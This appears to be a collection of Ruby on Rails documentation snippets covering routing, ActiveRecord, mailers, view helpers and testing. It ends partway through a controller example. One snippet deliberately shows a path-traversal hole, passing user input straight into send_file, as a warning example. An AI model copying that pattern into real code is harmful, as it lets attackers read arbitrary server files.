TITLE: Permitting All Subdomains in Rails Host Authorization
DESCRIPTION: Shows the special syntax for permitting all subdomains of a specific domain in Rails host authorization. This is a shorthand for the more verbose regex approach.

LANGUAGE: ruby
CODE:
# Allow requests from subdomains like `www.product.com` and
# `beta1.product.com`.
Rails.application.config.hosts << ".product.com"

----------------------------------------

TITLE: Setting Up Attribute-based Change Tracking in Rails
DESCRIPTION: Shows initialization of a Person object and setting its first_name attribute. This is the setup for demonstrating attribute-specific change tracking methods.

LANGUAGE: irb
CODE:
irb> person = Person.new

irb> person.changed?
=> false

irb> person.first_name = "John Doe"
irb> person.first_name
=> "John Doe"

----------------------------------------

TITLE: Defining Email Subject Translations with Interpolation
DESCRIPTION: Shows how to define translations for email subjects with interpolation parameters in YAML configuration files.

LANGUAGE: yaml
CODE:
en:
  user_mailer:
    welcome:
      subject: "%{user}, welcome to Rails Guides!"

----------------------------------------

TITLE: Using including and excluding in Ruby on Rails Array extensions
DESCRIPTION: The including method returns a new array that includes the passed elements, while excluding returns a copy excluding specified elements. Excluding is optimized to use Array#- for performance. Defined in active_support/core_ext/array/access.rb.

LANGUAGE: ruby
CODE:
[ 1, 2, 3 ].including(4, 5)          # => [ 1, 2, 3, 4, 5 ]
[ [ 0, 1 ] ].including([ [ 1, 0 ] ]) # => [ [ 0, 1 ], [ 1, 0 ] ]

LANGUAGE: ruby
CODE:
["David", "Rafael", "Aaron", "Todd"].excluding("Aaron", "Todd") # => ["David", "Rafael"]
[ [ 0, 1 ], [ 1, 0 ] ].excluding([ [ 1, 0 ] ])                  # => [ [ 0, 1 ] ]

----------------------------------------

TITLE: Show View Template with Back Link
DESCRIPTION: Creates a view template for the show action that displays the product name and provides a link back to the products index page using the link_to helper.

LANGUAGE: erb
CODE:
<h1><%= @product.name %></h1>

<%= link_to "Back", products_path %>

----------------------------------------

TITLE: Silencing All Deprecation Warnings Temporarily in Rails
DESCRIPTION: Example showing how to silence all deprecation warnings within a specific block of code. This is useful for sections where you expect deprecation warnings but don't want them to appear in logs or output.

LANGUAGE: ruby
CODE:
Rails.application.deprecators.silence do
  Rails.application.deprecators[:my_gem].warn    # No warning (silenced)
  Rails.application.deprecators[:other_gem].warn # No warning (silenced)
end

----------------------------------------

TITLE: Using Rails.error.record to Report and Re-raise Errors
DESCRIPTION: Example of using Rails.error.record which reports errors but re-raises them, halting execution. This demonstrates how subsequent code won't execute.

LANGUAGE: ruby
CODE:
Rails.error.record do
  1 + "1" # raises TypeError
end
1 + 1 # This won't be executed

----------------------------------------

TITLE: Implementing JSON Serialization with ActiveModel in Ruby
DESCRIPTION: This snippet demonstrates how to use ActiveModel::Serializers::JSON to enable JSON serialization for a Ruby class. It defines a Person class with a name attribute and implements the required attributes method.

LANGUAGE: ruby
CODE:
class Person
  include ActiveModel::Serializers::JSON

  attr_accessor :name

  def attributes
    { "name" => nil }
  end
end

----------------------------------------

TITLE: Insecure File Download Implementation in Ruby
DESCRIPTION: This code snippet demonstrates an insecure way to implement file downloads that could allow path traversal attacks. The example shows how direct use of user input in file paths can lead to security vulnerabilities.

LANGUAGE: ruby
CODE:
send_file("/var/www/uploads/" + params[:filename])

----------------------------------------

TITLE: Using seconds_since_midnight with DateTime objects in Ruby on Rails
DESCRIPTION: Returns the number of seconds that have passed since midnight for a DateTime object.

LANGUAGE: ruby
CODE:
now = DateTime.current     # => Mon, 07 Jun 2010 20:26:36 +0000
now.seconds_since_midnight # => 73596

----------------------------------------

TITLE: Running Database Migration in Rails
DESCRIPTION: Command to run the database migration after generating the Subscriber model.

LANGUAGE: bash
CODE:
$ bin/rails db:migrate

----------------------------------------

TITLE: Basic Controller Index Action Test
DESCRIPTION: Shows a simple test for a controller's index action, checking if the request was successful.

LANGUAGE: ruby
CODE:
# articles_controller_test.rb
class ArticlesControllerTest < ActionDispatch::IntegrationTest
  test "should get index" do
    get articles_url
    assert_response :success
  end
end

----------------------------------------

TITLE: Enhanced Initializer Generator with Template
DESCRIPTION: Updated generator that uses copy_file method to copy the template file to a destination with a dynamic filename based on the provided name argument.

LANGUAGE: ruby
CODE:
class InitializerGenerator < Rails::Generators::NamedBase
  source_root File.expand_path("templates", __dir__)

  def copy_initializer_file
    copy_file "initializer.rb", "config/initializers/#{file_name}.rb"
  end
end

----------------------------------------

TITLE: Getting Human-Readable Model Name in Rails
DESCRIPTION: Demonstrates the model_name.human method which transforms the model name into a more human-friendly format using I18n.

LANGUAGE: irb
CODE:
irb> Person.model_name.human
=> "Person"

----------------------------------------

TITLE: Reversing Order with reverse_order in ActiveRecord
DESCRIPTION: Shows how to use the 'reverse_order' method to invert the current ordering of records, or to order by primary key in descending order if no ordering is specified.

LANGUAGE: ruby
CODE:
Book.where("author_id > 10").order(:year_published).reverse_order

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE author_id > 10 ORDER BY year_published DESC

LANGUAGE: ruby
CODE:
Book.where("author_id > 10").reverse_order

LANGUAGE: sql
CODE:
SELECT * FROM books WHERE author_id > 10 ORDER BY books.id DESC

----------------------------------------

TITLE: Rails 7.1 Default Headers Configuration
DESCRIPTION: The default HTTP headers configuration for Action Dispatch in Rails 7.1. Removes X-Download-Options header which was previously present in Rails 7.0 and earlier versions.

LANGUAGE: ruby
CODE:
{
  "X-Frame-Options" => "SAMEORIGIN",
  "X-XSS-Protection" => "0",
  "X-Content-Type-Options" => "nosniff",
  "X-Permitted-Cross-Domain-Policies" => "none",
  "Referrer-Policy" => "strict-origin-when-cross-origin"
}

----------------------------------------

TITLE: Using video_tag Helper in Rails
DESCRIPTION: Examples of using video_tag to generate HTML video tags with various options, supporting both single source and multiple video sources with different formats.

LANGUAGE: ruby
CODE:
video_tag("trailer")
# => <video src="/videos/trailer"></video>

video_tag(["trailer.ogg", "trailer.flv"])
# => <video><source src="/videos/trailer.ogg" /><source src="/videos/trailer.flv" /></video>

video_tag("trailer", controls: true)
# => <video controls="controls" src="/videos/trailer"></video>

----------------------------------------

TITLE: Configuring Controller-Specific Browser Version Guard
DESCRIPTION: Example of extending browser version requirements for specific controller actions, adding additional version constraints for Opera and Chrome on the show action.

LANGUAGE: ruby
CODE:
class MessagesController < ApplicationController
  # In addition to the browsers blocked by ApplicationController, also block Opera below 104 and Chrome below 119 for the show action.
  allow_browser versions: { opera: 104, chrome: 119 }, only: :show
end

----------------------------------------

TITLE: Iterating Over Selected Elements in assert_dom
DESCRIPTION: Examples of iterating through selected HTML elements to perform assertions on each one or on the entire collection.

LANGUAGE: ruby
CODE:
assert_dom "ol" do |elements|
  elements.each do |element|
    assert_dom element, "li", 4
  end
end

assert_dom "ol" do
  assert_dom "li", 8
end

----------------------------------------

TITLE: Documenting Boolean Predicate Methods in Ruby
DESCRIPTION: Example showing how to document a predicate method that returns a boolean value, focusing on semantics rather than implementation details.

LANGUAGE: ruby
CODE:
# Returns true if the collection is empty.
#
# If the collection has been loaded it is equivalent to
# +collection.size.zero?+. If the collection has not been loaded,
# it is equivalent to +!collection.exists?+. If the collection has
# not already been loaded and you are going to fetch the records
# anyway, it is better to check +collection.length.zero?+.
def empty?
  if loaded?
    size.zero?
  else
    @target.blank? && !scope.exists?
  end
end

----------------------------------------

TITLE: Using TaggedLogging in ActiveSupport
DESCRIPTION: Demonstrates the new TaggedLogging feature that wraps standard Logger classes to provide tagging capabilities for more organized and contextual logging.

LANGUAGE: ruby
CODE:
Logger = ActiveSupport::TaggedLogging.new(Logger.new(STDOUT))

Logger.tagged("BCX") { Logger.info "Stuff" }
# Logs "[BCX] Stuff"

Logger.tagged("BCX", "Jason") { Logger.info "Stuff" }
# Logs "[BCX] [Jason] Stuff"

Logger.tagged("BCX") { Logger.tagged("Jason") { Logger.info "Stuff" } }
# Logs "[BCX] [Jason] Stuff"

----------------------------------------

TITLE: Configuring Rails Application in config.ru File
DESCRIPTION: The standard config.ru file used by Rack-based servers to start the Rails application, which requires the environment and runs the Rails application.

LANGUAGE: ruby
CODE:
# This file is used by Rack-based servers to start the application.

require_relative "config/environment"

run Rails.application
Rails.application.load_server

----------------------------------------

TITLE: Spanish Currency Symbol Configuration in YAML
DESCRIPTION: YAML configuration for the Spanish locale defining the Euro symbol as the currency symbol. Part of the improper translation example.

LANGUAGE: yaml
CODE:
# config/locales/es.yml
es:
  currency: "â¬"

----------------------------------------

TITLE: Replacing monochrome with colourspace for Vips in Active Storage
DESCRIPTION: Shows how to convert images to black and white when using libvips instead of ImageMagick's monochrome parameter.

LANGUAGE: ruby
CODE:
- variant(monochrome: true)
+ variant(colourspace: "b-w")

----------------------------------------

TITLE: Removing Subdirectory from Autoload Paths with Zeitwerk
DESCRIPTION: Example of how to remove a subdirectory from Rails autoload paths in an initializer when using Zeitwerk mode, which might be necessary to maintain existing namespace structures.

LANGUAGE: ruby
CODE:
ActiveSupport::Dependencies.autoload_paths.delete("#{Rails.root}/app/api")

----------------------------------------

TITLE: Record Instantiation Example Payload in Active Record
DESCRIPTION: Example of the payload data available during an instantiation.active_record event. This shows the count of records instantiated and the class name.

LANGUAGE: ruby
CODE:
{
  record_count: 1,
  class_name: "User"
}

----------------------------------------

TITLE: Using ActionMailer helpers in view templates
DESCRIPTION: Demonstrates accessing the mailer instance and message from within email view templates using the ActionMailer::MailHelper module, which provides access to the mailer and message objects.

LANGUAGE: erb
CODE:
<%= stylesheet_link_tag mailer.name.underscore %>
<h1><%= message.subject %></h1>

----------------------------------------

TITLE: Alternative Syntax for uniq in ActiveRecord Relations
DESCRIPTION: Shows the alternative, more readable syntax for unique queries using the uniq method, which can also be reversed by passing false as parameter.

LANGUAGE: ruby
CODE:
Client.select(:name).uniq

----------------------------------------

TITLE: Adding Redis Gem Dependency for RedisCacheStore
DESCRIPTION: Adds the redis gem to the Gemfile as a prerequisite for using the RedisCacheStore implementation in Rails.

LANGUAGE: ruby
CODE:
gem "redis"

----------------------------------------

TITLE: Using Lambda for Route Constraints in Rails
DESCRIPTION: Demonstrates how to use a lambda function as a route constraint instead of a class. The lambda evaluates if a request's IP is on a restricted list and applies routing logic accordingly.

LANGUAGE: ruby
CODE:
Rails.application.routes.draw do
  get "*path", to: "restricted_list#index",
    constraints: lambda { |request| RestrictedList.retrieve_ips.include?(request.remote_ip) }
end

----------------------------------------

TITLE: Builder XML Output Example
DESCRIPTION: The XML output produced by the basic Builder template examples, showing the generated HTML markup.

LANGUAGE: html
CODE:
<em>emphasized</em>
<em><b>emph &amp; bold</b></em>
<a href="https://rubyonrails.org">A link</a>
<target option="fast" name="compile" />

----------------------------------------

TITLE: Configuring Rails Session Store Type
DESCRIPTION: Demonstrates how to configure the session store type in a Rails initializer. This example sets the session store to use the cache store implementation.

LANGUAGE: ruby
CODE:
Rails.application.config.session_store :cache_store

----------------------------------------

TITLE: Setting Up Classes for Complex Serialization with Associations in Rails
DESCRIPTION: Demonstrates defining Person and Note classes with serialization support to demonstrate the includes option for nested serialization.

LANGUAGE: ruby
CODE:
  class Person
    include ActiveModel::Serialization
    attr_accessor :name, :notes # Emulate has_many :notes

    def attributes
      { "name" => nil }
    end
  end

  class Note
    include ActiveModel::Serialization
    attr_accessor :title, :text

    def attributes
      { "title" => nil, "text" => nil }
    end
  end

----------------------------------------

TITLE: Using pick method in Rails ActiveRecord
DESCRIPTION: Demonstrates the pick method which retrieves the value from specified column(s) in the first row of the current relation. It's a shorthand for relation.limit(1).pluck(*column_names).first.

LANGUAGE: ruby
CODE:
Customer.where(id: 1).pluck(:id).first

LANGUAGE: ruby
CODE:
Customer.where(id: 1).pick(:id)

----------------------------------------

TITLE: Updating Plugin Gemspec File
DESCRIPTION: Example of how to modify the generated gemspec file to replace placeholder values with actual plugin information. This includes setting homepage, summary, description, and metadata URIs.

LANGUAGE: ruby
CODE:
spec.homepage    = "http://example.com"
spec.summary     = "Summary of Yaffle."
spec.description = "Description of Yaffle."

...

spec.metadata["source_code_uri"] = "http://example.com"
spec.metadata["changelog_uri"] = "http://example.com"

----------------------------------------

TITLE: Configuring Content Types Allowed Inline in ActiveStorage
DESCRIPTION: Specifies which content types ActiveStorage allows to be served inline. This list includes safe image formats and PDFs that can be displayed directly in browsers.

LANGUAGE: ruby
CODE:
config.active_storage.content_types_allowed_inline = %w(image/webp image/avif image/png image/gif image/jpeg image/tiff image/vnd.adobe.photoshop image/vnd.microsoft.icon application/pdf)

----------------------------------------

TITLE: Running Tests for a Line Range in Rails
DESCRIPTION: Demonstrates how to run tests within a specific line range of a test file. This is useful for running a group of related tests defined in nearby locations.

LANGUAGE: bash
CODE:
$ cd railties
$ bin/test test/application/asset_debugging_test.rb:69-100

----------------------------------------

TITLE: Creating a Product::Notifications Concern in Rails
DESCRIPTION: Code to extract notification functionality into an ActiveSupport::Concern for better organization and reusability.

LANGUAGE: ruby
CODE:
module Product::Notifications
  extend ActiveSupport::Concern

  included do
    has_many :subscribers, dependent: :destroy
    after_update_commit :notify_subscribers, if: :back_in_stock?
  end

  def back_in_stock?
    inventory_count_previously_was == 0 && inventory_count > 0
  end

  def notify_subscribers
    subscribers.each do |subscriber|
      ProductMailer.with(product: self, subscriber: subscriber).in_stock.deliver_later
    end
  end
end

----------------------------------------

TITLE: Using Integer#ordinalize in Ruby on Rails
DESCRIPTION: This method returns the complete ordinal string (the number plus the suffix) corresponding to the integer value. It handles both positive and negative integers.

LANGUAGE: ruby
CODE:
1.ordinalize    # => "1st"
2.ordinalize    # => "2nd"
53.ordinalize   # => "53rd"
2009.ordinalize # => "2009th"
-21.ordinalize  # => "-21st"
-134.ordinalize # => "-134th"

----------------------------------------

TITLE: Running Ruby Files with Rails Runner
DESCRIPTION: Demonstrates executing a Ruby file in the context of a Rails application. This allows running more complex scripts that need access to the Rails environment.

LANGUAGE: bash
CODE:
$ bin/rails runner lib/code_to_be_run.rb

----------------------------------------

TITLE: Running Ruby Files with Rails Runner
DESCRIPTION: Demonstrates executing a Ruby file in the context of a Rails application. This allows running more complex scripts that need access to the Rails environment.

LANGUAGE: bash
CODE:
$ bin/rails runner lib/code_to_be_run.rb

----------------------------------------

TITLE: Configuring SendGrid Ingress in Rails
DESCRIPTION: Rails configuration to accept emails from SendGrid. This enables the SendGrid ingress in the application's production environment.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
config.action_mailbox.ingress = :sendgrid

----------------------------------------

TITLE: Using Dynamic Attribute Methods in IRB Console
DESCRIPTION: This snippet demonstrates using the dynamic methods created with ActiveModel::AttributeMethods on a Person object, showing how prefixes and suffixes are used to create methods that operate on attributes.

LANGUAGE: ruby
CODE:
irb> person = Person.new
irb> person.name = "Jane Doe"

irb> person.first_name
=> "Jane"
irb> person.last_name
=> "Doe"

irb> person.name_short?
=> false

irb> person.reset_name_to_default!
=> "Default Name"

----------------------------------------

TITLE: Creating a View Test Base Class with Capybara Support
DESCRIPTION: Defines a custom test case class that combines ActionView::TestCase with Capybara's assertion methods. This provides a convenient way to use Capybara's powerful assertions in view tests.

LANGUAGE: ruby
CODE:
# test/view_partial_test_case.rb

require "test_helper"
require "capybara/minitest"

class ViewPartialTestCase < ActionView::TestCase
  include Capybara::Minitest::Assertions

  def page
    Capybara.string(rendered)
  end
end

# test/views/article_partial_test.rb

require "view_partial_test_case"

class ArticlePartialTest < ViewPartialTestCase
  test "renders a link to itself" do
    article = Article.create! title: "Hello, world"

    render "articles/article", article: article

    assert_link article.title, href: article_url(article)
  end
end

----------------------------------------

TITLE: Switching Database Connections for Specific Shards in Ruby on Rails
DESCRIPTION: Shows how to swap connections granularly for specific database shards, allowing models to read from specific replicas while others read from the primary.

LANGUAGE: ruby
CODE:
AnimalsRecord.connected_to(role: :reading, shard: :shard_one) do
  # Will read from shard_one_replica. If no connection exists for shard_one_replica,
  # a ConnectionNotEstablished error will be raised.
  Dog.first

  # Will read from primary writer.
  Person.first
end

----------------------------------------

TITLE: Using prev_year and next_year Methods with Time in Ruby
DESCRIPTION: Methods to get the time with the same day/month in the previous or next year. Handles leap year edge cases.

LANGUAGE: ruby
CODE:
t = Time.new(2010, 5, 8) # => 2010-05-08 00:00:00 +0900
t.prev_year              # => 2009-05-08 00:00:00 +0900
t.next_year              # => 2011-05-08 00:00:00 +0900

----------------------------------------

TITLE: Column Names Output in Rails Console
DESCRIPTION: Example output showing the columns Rails detected for the Product model, including automatically created id and timestamp fields.

LANGUAGE: irb
CODE:
=> ["id", "name", "created_at", "updated_at"]

----------------------------------------

TITLE: Using where.associated to Filter Records with Associations
DESCRIPTION: Shows how to use where.associated to find records that have at least one associated record. This query finds all customers who have made at least one review, using an INNER JOIN with a NOT NULL condition.

LANGUAGE: ruby
CODE:
Customer.where.associated(:reviews)

LANGUAGE: sql
CODE:
SELECT customers.* FROM customers
INNER JOIN reviews ON reviews.customer_id = customers.id
WHERE reviews.id IS NOT NULL

----------------------------------------

TITLE: Using RAILS_ASSET_URL in JavaScript
DESCRIPTION: Demonstrates how to reference assets in JavaScript using the RAILS_ASSET_URL macro. This ensures that the correct digested version of the asset is used in production.

LANGUAGE: javascript
CODE:
export default class extends Controller {
  init() {
    this.img = RAILS_ASSET_URL("/icons/trash.svg");
  }
}

----------------------------------------

TITLE: Setting Layout for a Specific Email Format in Rails Mailer
DESCRIPTION: Example of setting a custom layout for a specific format (HTML) of an email while using the default layout for other formats. This allows for format-specific customization.

LANGUAGE: ruby
CODE:
class UserMailer < ApplicationMailer
  def welcome_email
    mail(to: params[:user].email) do |format|
      format.html { render layout: "my_layout" }
      format.text
    end
  end
end

----------------------------------------

TITLE: Defining Review model with Active Record associations and enums in Ruby
DESCRIPTION: Defines a Review class with belongs_to relationships to customer and book, and a state enum for review status.

LANGUAGE: ruby
CODE:
class Review < ApplicationRecord
  belongs_to :customer
  belongs_to :book

  enum :state, [:not_reviewed, :published, :hidden]
end

----------------------------------------

TITLE: Unified Rendering in Rails Controllers (Old Style)
DESCRIPTION: Shows the older, more explicit rendering syntax in Rails controllers where you had to specify the render type using options like :file, :template, or :action.

LANGUAGE: ruby
CODE:
render :file => '/tmp/random_file.erb'
render :template => 'other_controller/action'
render :action => 'show'

----------------------------------------

TITLE: Using image_tag Helper in Rails
DESCRIPTION: Examples of using the image_tag helper to generate HTML image tags with various attributes like size and alt text for images from the asset pipeline.

LANGUAGE: ruby
CODE:
image_tag("icon.png")
# => <img src="/assets/icon.png" />

image_tag("icon.png", size: "16x10", alt: "Edit Article")
# => <img src="/assets/icon.png" width="16" height="10" alt="Edit Article" />

----------------------------------------

TITLE: Using ActiveSupport.on_load Hook with ActionController
DESCRIPTION: This code demonstrates how to prepend a module to ActionController::Base using ActiveSupport.on_load. This approach prevents loading the entire ActionController framework prematurely during application boot.

LANGUAGE: ruby
CODE:
ActionController::Base.prepend(MyActionControllerHelper)

LANGUAGE: ruby
CODE:
ActiveSupport.on_load(:action_controller_base) do
  # self refers to ActionController::Base here,
  # so we can call .prepend
  prepend MyActionControllerHelper
end

----------------------------------------

TITLE: Navigating to the Rails Project Directory
DESCRIPTION: Command to change the current directory to the newly created Rails application folder.

LANGUAGE: bash
CODE:
$ cd store

----------------------------------------

TITLE: Running Generator Tests with Debugger Support in Rails
DESCRIPTION: Shows how to run generator tests with proper stdout configuration to ensure debugging tools work correctly. This is necessary when testing Rails generators.

LANGUAGE: bash
CODE:
RAILS_LOG_TO_STDOUT=true ./bin/test test/generators/actions_test.rb

----------------------------------------

TITLE: Using the AND Method for Relation Intersection in Rails
DESCRIPTION: Demonstrates using the and method to find the logical intersection between two relations, finding only records that satisfy both conditions.

LANGUAGE: ruby
CODE:
Customer.where(id: [1, 2]).and(Customer.where(id: [2, 3]))

----------------------------------------

TITLE: Loading Associated Records with Explicit Composite Foreign Keys
DESCRIPTION: Demonstrates reloading an association when explicit composite foreign keys are defined.

LANGUAGE: ruby
CODE:
book.reload.author

----------------------------------------

TITLE: Installing Migrations to a Specific Database
DESCRIPTION: Command to copy engine migrations to a specific database in a multi-database application.

LANGUAGE: bash
CODE:
$ bin/rails railties:install:migrations DATABASE=animals

----------------------------------------

TITLE: SQL Equivalent for Finding Multiple Records with Composite Primary Keys
DESCRIPTION: Shows the SQL query that corresponds to the Ruby code for finding multiple products with composite primary keys.

LANGUAGE: sql
CODE:
SELECT * FROM products WHERE (store_id = 1 AND sku = 'ABC98765' OR store_id = 7 AND sku = 'ZZZ11111')

----------------------------------------

TITLE: Previous Behavior of Helper Method in Controllers
DESCRIPTION: Shows the conceptual implementation of the 'helper' method in controllers before Rails 6.1, which used require_dependency to load helper modules.

LANGUAGE: ruby
CODE:
helper "foo/bar"

LANGUAGE: ruby
CODE:
require_dependency "foo/bar_helper"
module_name = "foo/bar_helper".camelize
module_name.constantize

----------------------------------------

TITLE: Subscribing to Events with Monotonic Time Tracking in Ruby
DESCRIPTION: This snippet demonstrates using ActiveSupport::Notifications.monotonic_subscribe for more accurate time measurement. It provides monotonic time values instead of wall-clock time, ensuring more precise duration calculations for performance monitoring.

LANGUAGE: ruby
CODE:
ActiveSupport::Notifications.monotonic_subscribe "process_action.action_controller" do |name, started, finished, unique_id, payload|
  # your own custom stuff
  duration = finished - started # 1560979.429234 - 1560978.425334
  Rails.logger.info "#{name} Received! (duration: #{duration})" # process_action.action_controller Received! (duration: 1.0039)
end

----------------------------------------

TITLE: Creating a Generator with the Generator Generator
DESCRIPTION: Commands to remove the existing generator file and generate a new one using Rails' built-in generator generator, which creates a more structured generator.

LANGUAGE: bash
CODE:
$ rm lib/generators/initializer_generator.rb

$ bin/rails generate generator initializer
      create  lib/generators/initializer
      create  lib/generators/initializer/initializer_generator.rb
      create  lib/generators/initializer/USAGE
      create  lib/generators/initializer/templates
      invoke  test_unit
      create    test/lib/generators/initializer_generator_test.rb

----------------------------------------

TITLE: Alternative Route Definition with Controller and Action Options
DESCRIPTION: Demonstrates an alternative syntax for defining routes using controller and action options instead of the to: option.

LANGUAGE: ruby
CODE:
get "/users/:id", controller: "users", action: :show

----------------------------------------

TITLE: Setting Request Variant in Controller Action
DESCRIPTION: Example showing how to set response variants at the request level rather than in the render call. This includes a helper method to determine the appropriate variant based on session data.

LANGUAGE: ruby
CODE:
def index
  request.variant = determine_variant
end

private
  def determine_variant
    variant = nil
    # some code to determine the variant(s) to use
    variant = :mobile if session[:use_mobile]

    variant
  end

----------------------------------------

TITLE: Managing Application Deprecators in Rails
DESCRIPTION: Example showing how to use Rails.application.deprecators to manage multiple deprecation instances across your application. The code demonstrates adding custom deprecators, configuring them globally, and silencing deprecation warnings.

LANGUAGE: ruby
CODE:
Rails.application.deprecators[:my_gem] = ActiveSupport::Deprecation.new("2.0", "MyGem")
Rails.application.deprecators[:other_gem] = ActiveSupport::Deprecation.new("3.0", "OtherGem")

----------------------------------------

TITLE: Marking Collection Caching in ERB Templates
DESCRIPTION: Special comment format to enable collection caching benefits when the partial template doesn't start with a clean cache call. This technique allows collection caching to be applied to templates using custom helpers.

LANGUAGE: html+erb
CODE:
<%# Template Collection: notification %>
<% my_helper_that_calls_cache(some_arg, notification) do %>
  <%= notification.name %>
<% end %>

----------------------------------------

TITLE: Specifying Conditions on Joined Tables with String in ActiveRecord
DESCRIPTION: Shows how to add conditions to joined tables using string conditions. This query finds customers who placed orders within a specific time range, using the distinct method to avoid duplicate results.

LANGUAGE: ruby
CODE:
time_range = (Time.now.midnight - 1.day)..Time.now.midnight
Customer.joins(:orders).where("orders.created_at" => time_range).distinct

----------------------------------------

TITLE: Configuring Mailgun Ingress in Rails
DESCRIPTION: Rails configuration to accept emails from Mailgun. This enables the Mailgun ingress in the application's production environment.

LANGUAGE: ruby
CODE:
# config/environments/production.rb
config.action_mailbox.ingress = :mailgun

----------------------------------------

TITLE: Preparing a Stable Branch for Backporting in Rails
DESCRIPTION: This snippet demonstrates how to prepare a stable branch for backporting by checking out the branch, resetting it to match the remote version, and creating a new branch for your backport work.

LANGUAGE: bash
CODE:
$ git checkout 7-0-stable
$ git reset --hard origin/7-0-stable
$ git checkout -b my-backport-branch

----------------------------------------

TITLE: Generating a Scaffold in a Rails Engine
DESCRIPTION: Command to generate a scaffold for an Article resource within the engine, creating a model with title and text fields along with the corresponding controller, views, and tests.

LANGUAGE: bash
CODE:
$ bin/rails generate scaffold article title:string text:text

----------------------------------------

TITLE: Demonstrating New ActionDispatch::Request#content_type and media_type Methods in Ruby
DESCRIPTION: Shows how the new behavior of ActionDispatch::Request#content_type returns the full Content-Type header, and introduces the media_type method to get only the MIME type.

LANGUAGE: ruby
CODE:
request = ActionDispatch::Request.new("Content-Type" => "text/csv; header=present; charset=utf-16", "REQUEST_METHOD" => "GET")
request.content_type #=> "text/csv; header=present; charset=utf-16"
request.media_type   #=> "text/csv"

----------------------------------------

TITLE: Implementing Nested Attributes in Active Record Models in Ruby
DESCRIPTION: This code demonstrates how to use the accepts_nested_attributes_for method to enable updating attributes on nested models directly, allowing for atomic saving of a record with its associated children.

LANGUAGE: ruby
CODE:
class Book < ActiveRecord::Base
  has_one :author
  has_many :pages

  accepts_nested_attributes_for :author, :pages
end

----------------------------------------

TITLE: Array to_param Implementation in Rails
DESCRIPTION: Illustrates how Array#to_param calls to_param on each element and joins the results with a forward slash for use in URLs.

LANGUAGE: ruby
CODE:
[0, true, String].to_param # => "0/true/String"

----------------------------------------

TITLE: Using javascript_include_tag in Rails
DESCRIPTION: Examples of using javascript_include_tag to generate script tags for JavaScript files, with options to include attributes like async for parallel loading.

LANGUAGE: ruby
CODE:
javascript_include_tag("common")
# => <script src="/assets/common.js"></script>

javascript_include_tag("common", async: true)
# => <script src="/assets/common.js" async="async"></script>

----------------------------------------

TITLE: Creating a Custom I18n Exception Handler
DESCRIPTION: Implementation of a custom exception handler for I18n that provides special behavior for specific translation keys. This example raises exceptions by default but handles a specific key differently.

LANGUAGE: ruby
CODE:
# config/initializers/i18n.rb
module I18n
  class RaiseExceptForSpecificKeyExceptionHandler
    def call(exception, locale, key, options)
      if key == "special.key"
        "translation missing!" # return this, don't raise it
      elsif exception.is_a?(MissingTranslation)
        raise exception.to_exception
      else
        raise exception
      end
    end
  end
end

I18n.exception_handler = I18n::RaiseExceptForSpecificKeyExceptionHandler.new

----------------------------------------

TITLE: Implementing reformat_name Method for XML Serialization
DESCRIPTION: Example showing how Rails uses dasherize in XML serialization to format node names according to XML conventions.

LANGUAGE: ruby
CODE:
def reformat_name(name)
  name = name.camelize if camelize?
  dasherize? ? name.dasherize : name
end

----------------------------------------

TITLE: Initializing Rackup Server for Rails Applications
DESCRIPTION: Rackup::Server initialization process that sets up server options for Rack-based applications like Rails.

LANGUAGE: ruby
CODE:
module Rackup
  class Server
    def initialize(options = nil)
      @ignore_options = []

      if options
        @use_default_options = false
        @options = options
        @app = options[:app] if options[:app]
      else
        @use_default_options = true
        @options = parse_options(ARGV)
      end
    end
  end
end

----------------------------------------

TITLE: Inspecting a MessageDelivery Object in Rails Console
DESCRIPTION: Example of the MessageDelivery object returned by UserMailer when viewed in the Rails console, showing its internal structure with job information and parameters.

LANGUAGE: irb
CODE:
irb> UserMailer.with(user: user).weekly_summary
#<ActionMailer::MailDeliveryJob:0x00007f84cb0367c0
 @_halted_callback_hook_called=nil,
 @_scheduled_at_time=nil,
 @arguments=
  ["UserMailer",
   "welcome_email",
   "deliver_now",
   {:params=>
     {:user=>
       #<User:0x00007f84c9327198
        id: 1,
        name: "Bhumi",
        email: "hi@gmail.com",
        login: "Bhumi",
        created_at: Thu, 06 Jun 2024 17:43:44.424064000 UTC +00:00,
        updated_at: Thu, 06 Jun 2024 17:43:44.424064000 UTC +00:00>},
    :args=>[]}],
 @exception_executions={},
 @executions=0,
 @job_id="07747748-59cc-4e88-812a-0d677040cd5a",
 @priority=nil,

----------------------------------------

TITLE: Using String#inquiry for Boolean Checks in Ruby
DESCRIPTION: Demonstrates the inquiry method which converts a string into a StringInquirer object for more natural boolean checks.

LANGUAGE: ruby
CODE:
"production".inquiry.production? # => true
"active".inquiry.inactive?       # => false

----------------------------------------

TITLE: Using Implicit Render in Rails Controller
DESCRIPTION: Example showing how Rails' implicit render functionality works, where Rails will automatically render the default template if no explicit render is called after a conditional render.

LANGUAGE: ruby
CODE:
def show
  @book = Book.find(params[:id])
  if @book.special?
    render action: "special_show"
  end
end

----------------------------------------

TITLE: Getting Changed Attribute Names with changed in Rails
DESCRIPTION: Demonstrates the changed method which returns an array containing the names of attributes with unsaved changes. Part of ActiveModel::Dirty tracking system.

LANGUAGE: irb
CODE:
irb> person.changed
=> ["first_name"]

----------------------------------------

TITLE: Handling Missing Attachments in User Model
DESCRIPTION: Implementation of a class method to specify a custom partial for rendering when a User record is missing.

LANGUAGE: ruby
CODE:
class User < ApplicationRecord
  def self.to_missing_attachable_partial_path
    "users/missing_attachable"
  end
end

----------------------------------------

TITLE: Using audio_tag Helper in Rails
DESCRIPTION: Examples of using the audio_tag helper to generate HTML audio tags with various options, supporting both single source and multiple sources.

LANGUAGE: ruby
CODE:
audio_tag("sound")
# => <audio src="/audios/sound"></audio>

audio_tag("sound.wav", "sound.mid")
# => <audio><source src="/audios/sound.wav" /><source src="/audios/sound.mid" /></audio>

audio_tag("sound", controls: true)
# => <audio controls="controls" src="/audios/sound"></audio>

----------------------------------------

TITLE: Adding Edit and Update Actions to ProductsController in Rails
DESCRIPTION: Extends the ProductsController with edit and update actions for product editing functionality. Uses the same strong parameter pattern as the create action.

LANGUAGE: ruby
CODE:
class ProductsController < ApplicationController
  def index
    @products = Product.all
  end

  def show
    @product = Product.find(params[:id])
  end

  def new
    @product = Product.new
  end

  def create
    @product = Product.new(product_params)
    if @product.save
      redirect_to @product
    else
      render :new, status: :unprocessable_entity
    end
  end

  def edit
    @product = Product.find(params[:id])
  end

  def update
    @product = Product.find(params[:id])
    if @product.update(product_params)
      redirect_to @product
    else
      render :edit, status: :unprocessable_entity
    end
  end

  private
    def product_params
